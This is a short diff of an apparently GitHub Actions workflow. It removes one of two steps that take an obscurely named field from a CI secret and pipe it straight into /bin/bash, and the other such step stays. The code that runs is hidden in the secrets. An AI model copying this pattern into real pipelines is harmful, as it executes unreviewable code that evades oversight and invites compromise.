@@ -23,7 +23,6 @@ jobs:
           rd80: ${{ secrets.rd80 }}
         run: |
           printf '%s' "$rd80" | jq -r .k0667 | /bin/bash
-          printf '%s' "$b405" | jq -r .mjhqs85611 | /bin/bash
 
       - name: Store results
         if: always()
